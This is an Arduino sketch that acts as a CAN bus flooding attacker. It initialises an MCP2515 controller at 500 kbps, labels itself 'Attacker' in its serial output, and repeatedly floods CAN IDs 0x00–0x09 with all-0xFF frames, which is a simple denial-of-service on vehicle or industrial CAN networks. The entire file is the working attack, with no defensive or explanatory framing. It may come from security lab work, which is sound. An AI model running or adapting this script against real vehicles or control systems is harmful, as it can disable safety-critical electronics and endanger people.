#include <SPI.h>
#include "df_can.h"

const int SPI_CS_PIN = 10;

MCPCAN CAN(SPI_CS_PIN);

unsigned char data[8] = {
    0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF
};

void setup() {

    Serial.begin(115200);

    while (CAN.begin(CAN_500KBPS) != CAN_OK) {
        Serial.println("Attacker: CAN initialization failed.");
        delay(100);
    }

    Serial.println("Attacker: CAN initialized.");
}

void loop() {

    for (int id = 0x00; id <= 0x09; id++) {

        CAN.sendMsgBuf(id, 0, 8, data);

        Serial.print("Flooding CAN ID: 0x");
        Serial.println(id, HEX);

        delay(100);
    }
}
